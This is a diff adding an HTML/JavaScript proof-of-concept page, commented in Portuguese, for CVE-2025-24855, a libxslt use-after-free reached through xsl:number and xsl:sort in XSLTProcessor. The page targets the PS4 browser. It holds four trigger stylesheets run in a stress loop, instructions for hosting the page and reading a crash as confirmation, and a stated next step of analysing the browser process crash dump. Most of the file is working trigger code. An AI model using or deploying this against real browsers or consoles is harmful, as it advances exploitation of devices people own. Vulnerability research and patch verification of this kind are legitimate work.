@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html>
+<!--
+  PoC: CVE-2025-24855
+  Alvo: libxslt < 1.1.43 (numbers.c - xsltNumberFormatGetValue UAF)
+  Vetor: XSLTProcessor com xsl:number + predicados XPath aninhados
+  
+  Commit de fix: c7c7f1f78dd202a053996fcefe57eb994aec8ef2
+  Issue: https://gitlab.gnome.org/GNOME/libxslt/-/issues/128
+  Autor original: Ivan Fratric (Google Project Zero)
+  
+  ROOT CAUSE:
+  Em avaliações XPath aninhadas via xsl:number / xsl:sort,
+  o context->node é sobrescrito pela avaliação interna e nunca
+  restaurado. Acesso posterior ao nó original = UAF.
+  
+  Como usar no PS4:
+  1. Hospedar em servidor HTTP local
+  2. Abrir no browser do PS4
+  3. Crash do browser = bug presente
+-->
+<head>
+  <meta charset="UTF-8">
+  <title>CVE-2025-24855 PoC - libxslt numbers.c XPath context UAF</title>
+  <style>
+    body { background: #0a0a0a; color: #88ccff; font-family: monospace; padding: 20px; }
+    #log { background: #111; border: 1px solid #88ccff; padding: 15px; min-height: 200px;
+           max-height: 400px; overflow-y: auto; }
+    .ok   { color: #00ff88; }
+    .fail { color: #ff4444; }
+    .info { color: #ffaa00; }
+    .crash { color: #ff00ff; font-weight: bold; font-size: 1.2em; }
+  </style>
+</head>
+<body>
+  <h2>CVE-2025-24855 — libxslt numbers.c XPath Context Node UAF</h2>
+  <p>Testando via XSLTProcessor + xsl:number com XPath aninhado...</p>
+  <div id="log"></div>
+
+<script>
+"use strict";
+
+const log = (msg, cls) => {
+  const d = document.getElementById("log");
+  d.innerHTML += `<div class="${cls||'info'}">[${new Date().toISOString().substr(11,12)}] ${msg}</div>`;
+  d.scrollTop = d.scrollHeight;
+};
+
+log("=== CVE-2025-24855 PoC Iniciado ===");
+
+/*
+ * ROOT CAUSE DETALHADO:
+ *
+ * Em libxslt/numbers.c, a função xsltNumberFormatGetValue() é chamada
+ * para avaliar a expressão XPath de xsl:number (atributos count, from,
+ * value, level).
+ *
+ * O fluxo:
+ *
+ *   xsltApplyOneTemplate()
+ *     -> xsltNumber()           [handler para xsl:number]
+ *       -> xsltNumberFormat()
+ *         -> xsltNumberFormatGetValue(ctxt->xpathCtxt, ctxt->node, expr)
+ *           -> context->node = node      [define contexto]
+ *           -> xmlXPathEvalExpression()  [avalia XPath]
+ *             -> [se expr contém predicados com nested calls,
+ *                 context->node é sobrescrito pela avaliação interna]
+ *             -> [após retornar, context->node aponta para nó errado/freed]
+ *           -> [uso de context->node após UAF] ← CRASH
+ *
+ * Trigger: usar xsl:number com atributos count/from que contêm
+ * expressões XPath com predicados que modificam o contexto:
+ *   - Funções que retornam node-sets de documentos externos
+ *   - Predicados com chamadas recursivas implícitas
+ *   - xsl:sort em xsl:for-each combinado com xsl:number
+ *
+ * A variante mais confiável do P0 usa xsl:sort + xsl:number juntos,
+ * pois xsltComputeSortResultInternal() chama xsltNumberFormatGetValue()
+ * em um loop sobre os nós, e o context->node muda a cada iteração.
+ */
+
+// ============================================================
+// DOCUMENTO XML - Lista de itens para numerar e ordenar
+// ============================================================
+const xmlData = `<?xml version="1.0" encoding="UTF-8"?>
+<catalog>
+  <section id="s1" priority="3">
+    <item ref="a" weight="5">Alpha</item>
+    <item ref="b" weight="2">Beta</item>
+    <item ref="c" weight="8">Gamma</item>
+    <item ref="d" weight="1">Delta</item>
+    <item ref="e" weight="6">Epsilon</item>
+  </section>
+  <section id="s2" priority="1">
+    <item ref="f" weight="3">Zeta</item>
+    <item ref="g" weight="9">Eta</item>
+    <item ref="h" weight="4">Theta</item>
+    <item ref="i" weight="7">Iota</item>
+    <item ref="j" weight="2">Kappa</item>
+  </section>
+  <section id="s3" priority="2">
+    <item ref="k" weight="5">Lambda</item>
+    <item ref="l" weight="3">Mu</item>
+    <item ref="m" weight="8">Nu</item>
+    <item ref="n" weight="1">Xi</item>
+    <item ref="o" weight="6">Omicron</item>
+  </section>
+</catalog>`;
+
+// ============================================================
+// VARIANTE 1: xsl:number com level="multiple" + xsl:sort
+// Trigger principal do CVE-2025-24855
+// ============================================================
+const xslt_v1 = `<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+
+  <xsl:template match="/">
+    <result>
+      <!-- xsl:for-each + xsl:sort + xsl:number:
+           Esta combinação é o trigger clássico do CVE-2025-24855.
+           xsltComputeSortResultInternal() chama xsltNumberFormat()
+           para cada nó durante a ordenação, e o context->node
+           não é restaurado entre iterações. -->
+      <xsl:for-each select="//item">
+        <xsl:sort select="@weight" data-type="number" order="ascending"/>
+        <xsl:sort select="parent::section/@priority" data-type="number"/>
+        <item>
+          <!-- xsl:number com count que usa XPath complexo:
+               O atributo count usa um predicado que acessa
+               ancestor:: — isso força a avaliação em contexto
+               diferente do nó atual -->
+          <xsl:number
+            level="multiple"
+            count="section|item"
+            format="1.1"/>
+          <xsl:text> </xsl:text>
+          <xsl:value-of select="."/>
+          <xsl:text> [weight=</xsl:text>
+          <xsl:value-of select="@weight"/>
+          <xsl:text>]</xsl:text>
+        </item>
+      </xsl:for-each>
+    </result>
+  </xsl:template>
+
+</xsl:stylesheet>`;
+
+// ============================================================
+// VARIANTE 2: xsl:number com from= XPath que referencia
+// nós ancestrais (maximiza a traversal do context node)
+// ============================================================
+const xslt_v2 = `<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+
+  <xsl:template match="/">
+    <result>
+      <xsl:apply-templates select="//section"/>
+    </result>
+  </xsl:template>
+
+  <xsl:template match="section">
+    <sec>
+      <xsl:attribute name="num">
+        <!-- xsl:number com from= usando predicado:
+             A expressão 'catalog' como from + level=any
+             força a avaliação recursiva do XPath -->
+        <xsl:number level="any"
+                    count="item"
+                    from="catalog"/>
+      </xsl:attribute>
+      <!-- Ordenar items dentro de cada section -->
+      <xsl:for-each select="item">
+        <xsl:sort select="@weight" data-type="number" order="descending"/>
+        <xsl:sort select="@ref"/>
+        <i>
+          <!-- xsl:number com level=any dentro de xsl:sort:
+               Este é o cenário mais próximo do bug original do P0 -->
+          <xsl:number level="any"
+                      count="item[ancestor::section]"
+                      from="catalog"/>
+          <xsl:text>: </xsl:text>
+          <xsl:value-of select="."/>
+        </i>
+      </xsl:for-each>
+    </sec>
+  </xsl:template>
+
+</xsl:stylesheet>`;
+
+// ============================================================
+// VARIANTE 3: Combinação de xsl:number + xsl:key + predicado
+// com cross-reference — maximiza reentrada de context
+// ============================================================
+const xslt_v3 = `<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+
+  <!-- xsl:key cria uma estrutura indexada que xsl:number pode
+       acessar via key(), causando modificação do context durante
+       a avaliação do count/from -->
+  <xsl:key name="by-weight" match="item" use="@weight"/>
+  <xsl:key name="by-section" match="item" use="parent::section/@id"/>
+
+  <xsl:template match="/">
+    <result>
+      <!-- Processar todos os items ordenados por múltiplos critérios -->
+      <xsl:for-each select="//item">
+        <xsl:sort select="count(key('by-weight', @weight))"
+                  data-type="number"
+                  order="descending"/>
+        <xsl:sort select="@weight" data-type="number"/>
+        <xsl:sort select="count(key('by-section', parent::section/@id))"
+                  data-type="number"/>
+        <item>
+          <!-- xsl:number cujo count usa key() — acesso cruzado
+               que modifica context->doc durante avaliação -->
+          <xsl:number
+            level="any"
+            count="item[count(key('by-weight', @weight)) &gt; 1]"
+            from="catalog"/>
+          <xsl:text>. </xsl:text>
+          <xsl:value-of select="."/>
+          <xsl:text> (section: </xsl:text>
+          <xsl:value-of select="parent::section/@id"/>
+          <xsl:text>)</xsl:text>
+        </item>
+      </xsl:for-each>
+    </result>
+  </xsl:template>
+
+</xsl:stylesheet>`;
+
+// ============================================================
+// VARIANTE 4: Stress test — múltiplas transformações em loop
+// para aumentar a probabilidade de atingir o UAF
+// ============================================================
+const xslt_v4 = `<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+
+  <xsl:template match="/">
+    <r>
+      <!-- Nested for-each com xsl:number em cada nível -->
+      <xsl:for-each select="//section">
+        <xsl:sort select="@priority" data-type="number"/>
+        <s n="{position()}">
+          <xsl:number level="single" count="section"/>
+          <xsl:for-each select="item">
+            <xsl:sort select="@weight" data-type="number" order="ascending"/>
+            <i>
+              <!-- xsl:number com level=multiple dentro de nested for-each:
+                   context->node muda 3x por iteração sem restauração -->
+              <xsl:number level="multiple"
+                          count="section|item"/>
+            </i>
+          </xsl:for-each>
+        </s>
+      </xsl:for-each>
+    </r>
+  </xsl:template>
+
+</xsl:stylesheet>`;
+
+// ============================================================
+// Executor principal
+// ============================================================
+function parseXML(str) {
+  return new DOMParser().parseFromString(str, "application/xml");
+}
+
+async function runPoC() {
+  if (typeof XSLTProcessor === "undefined") {
+    log("XSLTProcessor NÃO disponível!", "fail");
+    return;
+  }
+  log("XSLTProcessor disponível ✓", "ok");
+
+  const xmlDoc = parseXML(xmlData);
+  if (xmlDoc.documentElement.nodeName === "parsererror") {
+    log("Erro ao parsear XML de entrada!", "fail");
+    return;
+  }
+  log("XML parseado: " + xmlDoc.querySelectorAll("item").length + " items", "ok");
+
+  const variants = [
+    { name: "V1: for-each+sort+number(level=multiple)", xslt: xslt_v1 },
+    { name: "V2: number(level=any, from=ancestor)", xslt: xslt_v2 },
+    { name: "V3: number+key() cross-reference", xslt: xslt_v3 },
+    { name: "V4: nested for-each+sort+number stress", xslt: xslt_v4 },
+  ];
+
+  for (const v of variants) {
+    log(`--- Iniciando ${v.name} ---`);
+    try {
+      const xsltDoc = parseXML(v.xslt);
+      if (xsltDoc.documentElement.nodeName === "parsererror") {
+        log(`  ERRO: XSLT parse falhou`, "fail");
+        continue;
+      }
+
+      const proc = new XSLTProcessor();
+      proc.importStylesheet(xsltDoc);
+
+      let successCount = 0;
+      // Loop intenso para maximizar a chance de hit no UAF
+      const ITERS = 200;
+      for (let i = 0; i < ITERS; i++) {
+        const result = proc.transformToDocument(xmlDoc);
+        if (result) successCount++;
+        // Yield ocasionalmente para não bloquear a UI
+        if (i % 50 === 49) {
+          await new Promise(r => setTimeout(r, 0));
+          log(`  Iteração ${i+1}/${ITERS}...`);
+        }
+      }
+      log(`  ${ITERS} transformações: ${successCount} OK`, successCount === ITERS ? "ok" : "fail");
+
+    } catch (e) {
+      log(`  EXCEÇÃO: ${e.toString()}`, "crash");
+      log(`  Stack: ${e.stack || 'N/A'}`, "fail");
+    }
+  }
+
+  log("=== RESUMO ===", "info");
+  log("Se o browser do PS4 crashou/recarregou: BUG PRESENTE (libxslt < 1.1.43)", "crash");
+  log("Se completou sem crash: libxslt >= 1.1.43 ou trigger precisa de refinamento", "info");
+  log("Próximo passo: análise do crash dump em SceNKWebProcess", "info");
+}
+
+window.addEventListener("load", () => {
+  setTimeout(runPoC, 300);
+});
+</script>
+</body>
+</html>
